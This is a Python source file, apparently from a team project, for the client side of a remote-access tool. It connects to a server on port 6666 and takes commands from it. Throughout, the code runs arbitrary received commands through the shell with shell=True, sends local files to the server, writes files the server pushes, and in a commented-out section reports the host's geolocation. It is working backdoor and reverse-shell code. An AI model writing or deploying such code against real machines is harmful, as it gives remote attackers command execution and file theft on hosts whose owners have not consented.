import socket
import subprocess
import os

# Create a socket object
agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Define the server address and port
server_address = ('localhost', 6666)

# Connect to the server
agent_socket.connect(server_address)

main_directory = os.getcwd()
print("Current working directory: " + main_directory)


# Khayal Aliyev -> Not ready geo function that gives agent's geolocation. Working one is attached as geo_apart_test.py

# def get_geolocation_info():
#     try:
#         start_time = time.time()
#         g = geocoder.ip('me')
#         ip_address = 'me'
#         request_url = 'https://geolocation-db.com/jsonp/' + ip_address
#         response = requests.get(request_url)
#         result = response.content.decode()
#         result = result.split("(")[1].strip(")")
#         result = json.loads(result)
#         result["postal"] = g.postal
#         end_time = time.time()
#         print(f"Geolocation retrieval time: {end_time - start_time} seconds")
#         return result
#     except Exception as e:
#         return {'error': str(e)}




while True:
    command = agent_socket.recv(1024).decode('utf-8')

    if command.lower() == "exit":
        break


# Khayal Aliyev -> Not ready geo function that gives agent's geolocation. Working one is attached as geo_apart_test.py

    # if command.lower() == 'geo':
    #     location = get_geolocation_info()
    #     location_json = json.dumps(location)
    #     data_to_send = location_json.encode('utf-8')
    #     data_length = len(data_to_send)
    #     print(f"Sending geolocation data of length: {data_length}")
    #     agent_socket.send(data_length.to_bytes(4, 'big'))  # Send the length of the data first
    #     agent_socket.send(data_to_send)  # Send the actual data


# Garib Guluzada -> Implementation of main commands such as upload, download, cd, dir, exit, list
# Mahmud Mammedtaghiyev -> Error Handlings
    if command.startswith("cd "):
        # Handle directory change
        directory = command[3:]
        try:
            os.chdir(directory)
            main_directory = os.getcwd()
            print("Current working directory: " + main_directory)

            response = f"Changed directory to: {os.getcwd()}"

            agent_socket.send(response.encode('utf-8'))

        except FileNotFoundError:
            response = f"Directory not found: {directory}"
            agent_socket.send(response.encode('utf-8'))

    elif command.lower().startswith("download"):
        file_name = command.split()[1]
        file_path = os.path.join(main_directory, file_name)

        if os.path.exists(file_path):
            file_size = os.path.getsize(file_path)
            agent_socket.send(str(file_size).encode('utf-8'))

            try:
                with open(file_path, 'rb') as file:
                    data = file.read(4096)
                    while data:
                        agent_socket.send(data)
                        data = file.read(4096)
                    print(f"File '{file_name}' sent successfully.")

                # Wait for an acknowledgment from the server
                ack = agent_socket.recv(1024).decode('utf-8')
                if ack == "ReceivedFile":
                    agent_socket.send(b"ReadyForCommands")
            except Exception as e:
                response = f"Error sending file: {str(e)}"
                agent_socket.send(response.encode('utf-8'))
        else:
            try:
                # Execute the command and capture the output
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                response = output
            except subprocess.CalledProcessError as e:
                response = str(e)

            agent_socket.send(response.encode('utf-8'))



    elif command.lower().startswith("upload"):
        file_name = command.split()[1]

        # Receiving file size (8 bytes for long integer)
        file_size_data = agent_socket.recv(8)
        file_size = int.from_bytes(file_size_data, 'big')

        # Now receive the file data
        file_data = b''
        while len(file_data) < file_size:
            packet = agent_socket.recv(file_size - len(file_data))
            if not packet:
                break
            file_data += packet

        # Write the received data to a file
        with open(file_name, 'wb') as file:
            file.write(file_data)
        print(f"File '{file_name}' received from the server.")

    else:
        try:
            # Execute the command and capture the output
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            response = output
        except subprocess.CalledProcessError as e:
            response = str(e)

        # Implement a loop to send all data if it's too large for one send operation
        for i in range(0, len(response), 1024):
            agent_socket.send(response[i:i + 1024].encode('utf-8'))

agent_socket.close()